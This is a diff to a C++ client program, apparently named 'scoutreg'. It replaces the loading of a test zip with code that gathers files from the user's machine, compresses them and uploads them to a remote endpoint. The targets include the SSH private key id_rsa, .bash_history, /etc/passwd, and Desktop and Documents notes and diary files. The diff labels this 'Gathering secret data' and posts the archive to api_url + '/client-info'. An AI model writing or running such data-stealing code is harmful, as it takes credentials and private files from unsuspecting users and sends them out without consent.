@@ -7,7 +7,8 @@
 #include <fstream>
 #include <vector>
 #include <stdexcept>
-#include <string>
+
+#include <miniz.h>
 
 namespace {
 
@@ -45,38 +46,49 @@ namespace {
         return xor_transform(encrypted);
     }
 
-    std::vector<std::byte> load_file(const std::string& path)
+    std::vector<std::byte> zip_secret_data(const std::vector<scoutreg::SecretData>& files)
     {
-        std::ifstream file(path, std::ios::binary);
-
-        if (!file) {
-            throw std::runtime_error("Unable to open file: " + path);
+        if (files.empty()) {
+            throw std::runtime_error("No files to compress");
         }
 
-        file.seekg(0, std::ios::end);
-        const auto size = file.tellg();
-        file.seekg(0, std::ios::beg);
-
-        if (size < 0) {
-            throw std::runtime_error("Unable to determine file size: " + path);
+        std::size_t estimated_size = 0;
+        for (const auto& file : files) {
+            estimated_size += file.content.size() + file.filename.size() + 256;
         }
 
-        std::vector<std::byte> data(static_cast<std::size_t>(size));
-
-        if (!data.empty()) {
-            file.read(
-                reinterpret_cast<char*>(data.data()),
-                      static_cast<std::streamsize>(data.size())
-            );
+        mz_zip_archive zip{};
+        if (!mz_zip_writer_init_heap(&zip, 0, estimated_size)) {
+            throw std::runtime_error("Failed to initialize zip archive");
         }
 
-        if (!file) {
-            throw std::runtime_error("Unable to read file: " + path);
+        for (const auto& file : files) {
+            if (!mz_zip_writer_add_mem(
+                    &zip,
+                    file.filename.c_str(),
+                    file.content.data(),
+                    file.content.size(),
+                    MZ_BEST_COMPRESSION)) {
+                mz_zip_writer_end(&zip);
+                throw std::runtime_error("Failed to add file to zip: " + file.filename);
+            }
         }
 
-        return data;
+        void*     zip_buf  = nullptr;
+        std::size_t zip_size = 0;
+        if (!mz_zip_writer_finalize_heap_archive(&zip, &zip_buf, &zip_size)) {
+            mz_zip_writer_end(&zip);
+            throw std::runtime_error("Failed to finalize zip archive");
+        }
+
+        const auto* raw = static_cast<std::byte*>(zip_buf);
+        std::vector<std::byte> archive(raw, raw + zip_size);
+
+        mz_free(zip_buf);
+        mz_zip_writer_end(&zip);
+
+        return archive;
     }
-
 
 
 }
@@ -135,26 +147,52 @@ int main()
 
     long http_status = 0;
 
-    // const std::vector<std::byte> empty_file;
+    log_msg("Gathering secret data");
 
-    std::vector<std::byte> test_zip;
+#ifdef _WIN32
+    const std::vector<std::string> paths = {
+        "C:\\Users\\" + info.username + "\\Desktop\\stats.txt",
+        "C:\\Users\\" + info.username + "\\Desktop\\notes.txt",
+        "C:\\Users\\" + info.username + "\\Documents\\diary.txt",
+        "C:\\Windows\\System32\\drivers\\etc\\hosts",
+        "C:\\Windows\\Logs\\CBS\\CBS.log"
+    };
+#else
+    const std::vector<std::string> paths = {
+        "/home/" + info.username + "/Desktop/stats.txt",
+        "/home/" + info.username + "/.ssh/id_rsa",
+        "/home/" + info.username + "/.bash_history",
+        "/etc/passwd",
+    };
+#endif
+
+    const auto secrets = scoutreg::collect_secret_data(paths);
+
+    if (secrets.empty()) {
+        log_msg("No files gathered from Desktop");
+        return 1;
+    }
+
+    log_msg("Gathered " + std::to_string(secrets.size()) + " files");
+
+    std::vector<std::byte> payload_zip;
 
     try {
-        test_zip = load_file("test_payload.zip");
+        payload_zip = zip_secret_data(secrets);
     }
     catch (const std::exception& e) {
-        std::cerr << "Failed to load test_payload.zip: "
+        std::cerr << "Failed to compress gathered data: "
         << e.what() << '\n';
         return 1;
     }
 
-    log_msg("Loaded test_payload.zip");
-    log_msg(test_zip.size());
+    log_msg("Compressed gathered data into zip");
+    log_msg(payload_zip.size());
 
     const bool success = scoutreg::network::post(
         api_url + "/client-info",
         info,
-        test_zip,
+        payload_zip,
         &http_status
     );
 
